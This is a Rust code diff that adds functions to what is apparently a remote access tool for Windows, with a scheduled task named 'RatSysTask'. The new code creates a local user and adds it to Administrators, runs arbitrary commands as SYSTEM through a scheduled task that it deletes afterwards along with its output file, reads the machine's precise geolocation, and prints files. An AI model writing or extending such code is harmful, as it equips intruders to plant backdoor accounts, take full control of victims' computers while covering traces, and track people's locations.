@@ -431,6 +431,74 @@ pub fn hosts_clear() -> Result<String> {
     Ok(format!("cleared custom hosts entries  |  {flush}"))
 }
 
+// ---------------------------------------------------------------- access / system
+
+/// Send a file to the default printer (uses the shell "Print" verb).
+pub fn print_file(path: &str) -> String {
+    run_program(
+        "powershell",
+        &[
+            "-NoProfile",
+            "-Command",
+            &format!("Start-Process -FilePath '{}' -Verb Print", path.replace('\'', "''")),
+        ],
+    )
+}
+
+/// Create a local user and add them to Administrators.
+pub fn new_user(name: &str, pass: &str) -> String {
+    let create = run_program("net", &["user", name, pass, "/add"]);
+    let promote = run_program("net", &["localgroup", "administrators", name, "/add"]);
+    format!("--- create ---\n{create}\n--- promote ---\n{promote}")
+}
+
+/// Run a command as SYSTEM via a one-shot scheduled task, capturing its output.
+pub fn systask(cmd: &str) -> Result<String> {
+    let out_file = std::env::temp_dir().join("systask.out");
+    let _ = std::fs::remove_file(&out_file);
+    let name = "RatSysTask";
+    let full = format!("cmd /c {} > \"{}\" 2>&1", cmd, out_file.display());
+    let create = run_program(
+        "schtasks",
+        &["/create", "/f", "/tn", name, "/tr", &full, "/sc", "once", "/st", "23:59", "/ru", "SYSTEM"],
+    );
+    if create.to_lowercase().contains("error") || create.contains("ERROR") {
+        anyhow::bail!("create failed (need admin?): {create}");
+    }
+    let _ = run_program("schtasks", &["/run", "/tn", name]);
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    let out = std::fs::read_to_string(&out_file).unwrap_or_default();
+    let _ = run_program("schtasks", &["/delete", "/f", "/tn", name]);
+    let _ = std::fs::remove_file(&out_file);
+    Ok(if out.trim().is_empty() {
+        "task ran as SYSTEM (no output)".into()
+    } else {
+        out
+    })
+}
+
+/// Precise location from the Windows Location API.
+pub fn location() -> Result<String> {
+    use windows::Devices::Geolocation::{GeolocationAccessStatus, Geolocator, PositionAccuracy};
+
+    let locator = Geolocator::new()?;
+    let access = Geolocator::RequestAccessAsync()?.get()?;
+    if access != GeolocationAccessStatus::Allowed {
+        anyhow::bail!("location access not granted");
+    }
+    let _ = locator.SetDesiredAccuracy(PositionAccuracy::High);
+    let pos = locator.GetGeopositionAsync()?.get()?;
+    let coord = pos.Coordinate()?;
+    let point = coord.Point()?;
+    let p = point.Position()?;
+    Ok(format!(
+        "lat {:.6}, lon {:.6}   (±{:.0} m)",
+        p.Latitude,
+        p.Longitude,
+        coord.Accuracy().unwrap_or(0.0)
+    ))
+}
+
 // ---------------------------------------------------------------- power / system
 
 pub fn reboot() {
